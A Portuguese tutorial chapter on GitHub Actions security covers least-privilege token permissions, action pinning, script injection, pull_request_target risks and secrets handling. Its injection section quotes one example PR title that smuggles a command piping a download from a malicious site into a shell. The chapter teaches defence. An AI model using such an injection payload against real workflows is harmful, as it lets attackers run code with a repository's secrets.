# 06. Boas práticas e segurança no GitHub Actions

Um workflow roda código com acesso ao seu repositório e, às vezes, a segredos. Na maior parte do tempo isso é exatamente o que se quer, mas também é o motivo de o Actions ser um alvo comum de ataque. A boa notícia é que poucos cuidados cobrem quase todo o risco, e todos eles cabem em projetos pequenos desde o primeiro dia. Os workflows da prática seguem cada um destes cuidados, então dá para abrir os arquivos e conferir.

## 1. Permissão mínima

Todo workflow recebe um `GITHUB_TOKEN`, e o que esse token pode fazer depende da chave `permissions` e das configurações do repositório. Se um passo do seu workflow for comprometido (uma action de terceiro maliciosa, por exemplo), o estrago possível é exatamente o que o token permite.

Declare `permissions` no topo, começando por leitura, e aumente só no job que precisa.

```yaml
permissions:
  contents: read          # vale para todos os jobs do arquivo

jobs:
  comentar:
    permissions:
      contents: read
      pull-requests: write   # só este job pode comentar no PR
```

Quando você declara `permissions`, tudo que não foi listado fica sem acesso. Em Settings, na seção Actions, também dá para definir a permissão padrão do token como somente leitura para o repositório inteiro.

## 2. Versão de action fixada

A linha `uses: actions/checkout@v7` diz qual versão da action usar. Existem três jeitos de escrever essa referência, com níveis diferentes de segurança.

| Forma | Exemplo | O que acontece |
| --- | --- | --- |
| Branch | `@main` | Usa o que estiver na branch no momento. Pode mudar a qualquer hora, sem aviso |
| Tag | `@v7` | Usa a versão marcada. Atualizações compatíveis chegam sozinhas, mas a tag pode ser movida pelo dono da action |
| SHA do commit | `@<sha-de-40-caracteres>` | Usa exatamente aquele código, para sempre. É a única referência imutável |

Para actions oficiais do GitHub, como as da organização `actions`, a tag da versão principal é um meio-termo razoável, e é o que este repositório usa. Para actions de terceiros, principalmente em projetos sensíveis, a recomendação é fixar pelo SHA completo e deixar um comentário com a versão, para saber o que é.

```yaml
- uses: dono/alguma-action@<sha-completo-do-commit>   # v2.3.1
```

Fixar pelo SHA tem um custo, porque você deixa de receber correções sozinho. O Dependabot resolve isso abrindo PRs que atualizam as referências dos workflows. Basta um arquivo `.github/dependabot.yml` com o ecossistema `github-actions`.

```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

## 3. Texto de usuário nunca vai direto para o script

Este é o erro de segurança mais comum em workflows, e ele é sutil. Veja este step.

```yaml
# ERRADO, não copie
- run: echo "Analisando ${{ github.event.pull_request.title }}"
```

O GitHub substitui a expressão `${{ }}` no texto do script antes de o shell rodar. Se alguém abrir um PR com o título `"; curl site-malicioso | sh; echo "`, o script que roda de verdade passa a ter esse comando dentro. Isso se chama injeção de script, e vale para qualquer texto que uma pessoa de fora consegue controlar, como título e corpo de PR, título de issue, comentário, nome de branch e mensagem de commit.

O jeito certo é passar o valor por uma variável de ambiente. Assim, o shell trata o conteúdo como dado, e não como código.

```yaml
# CERTO
- env:
    TITULO: ${{ github.event.pull_request.title }}
  run: echo "Analisando $TITULO"
```

Os workflows da prática usam esse padrão mesmo para valores inofensivos, como `github.actor`, para criar o hábito.

## 4. Cuidado com pull_request_target

Existem dois eventos parecidos para PR, e a diferença entre eles é uma das armadilhas mais conhecidas do Actions.

| Evento | Roda com o código de | Tem acesso a segredos em PR de fork? | Token |
| --- | --- | --- | --- |
| `pull_request` | O PR | Não | Somente leitura em PR de fork |
| `pull_request_target` | A branch base | Sim | Pode ter escrita |

O `pull_request_target` existe para casos específicos, como colocar labels em PRs de fork. O problema aparece quando alguém usa esse evento e, no mesmo workflow, faz checkout do código do PR e o executa. Aí o código de um desconhecido roda com os segredos e as permissões do seu repositório.

A regra prática para quem está começando é simples. Para CI, use `pull_request`. Se um tutorial pedir `pull_request_target`, entenda exatamente o motivo antes de copiar. A versão 7 do `actions/checkout` passou a recusar, por padrão, o checkout do código de PR de fork quando o workflow é disparado por `pull_request_target` ou `workflow_run`, justamente por causa desse risco.

## 5. Segredos

Algumas regras para não vazar o que deveria ficar guardado.

1. Segredo vai em Settings, na seção Secrets and variables, nunca no arquivo do workflow nem em outro arquivo do repositório.
2. Passe o segredo só para o step que precisa, via `env`, e não para o workflow inteiro.
3. Não imprima segredos no log. O GitHub mascara o valor cadastrado, mas um valor transformado (em base64, cortado ao meio, dentro de um JSON) pode escapar do mascaramento.
4. Em PR vindo de fork, os segredos não ficam disponíveis no evento `pull_request`. Isso é proteção, não defeito.
5. Prefira credenciais de curta duração quando o serviço permitir, como a autenticação por OIDC que os provedores de nuvem oferecem para o Actions.

## 6. Action de terceiro é código de terceiro

Usar uma action é executar o código de outra pessoa no seu runner. Antes de adicionar uma action nova, confira quem mantém, se o repositório tem atividade recente, quantos projetos usam e o que ela pede de permissão. Prefira actions oficiais ou muito usadas, e desconfie de actions com poucos usuários que pedem acesso a segredos.

## 7. Hábitos que evitam dor de cabeça

| Hábito | Por quê |
| --- | --- |
| `timeout-minutes` em todo job | Um script travado é cancelado em minutos, e não depois de horas |
| `concurrency` no CI de PR | Execuções antigas são canceladas quando chega um commit novo |
| `persist-credentials: false` no checkout, quando o job só lê | A credencial do Git não fica salva no runner sem necessidade |
| Filtro de `branches` nos eventos | O workflow roda só onde faz sentido |
| Nome claro em cada job e step | O log e os checks ficam legíveis para quem não escreveu o workflow |
| Verificar o YAML antes do push | Ferramentas como o `actionlint` acham erro de sintaxe e de expressão antes de gastar uma execução |

## Checklist rápido para revisar um workflow

- [ ] Tem `permissions` declarado, começando por `contents: read`?
- [ ] Toda action está fixada por tag ou SHA, e nenhuma por `@main`?
- [ ] Nenhum texto de PR, issue, branch ou commit vai direto para o `run` dentro de `${{ }}`?
- [ ] O CI usa `pull_request`, e não `pull_request_target`?
- [ ] Os segredos vão só para os steps que precisam?
- [ ] Todo job tem `timeout-minutes`?

Próximo arquivo, [07. Perguntas frequentes](07-perguntas-frequentes.md).
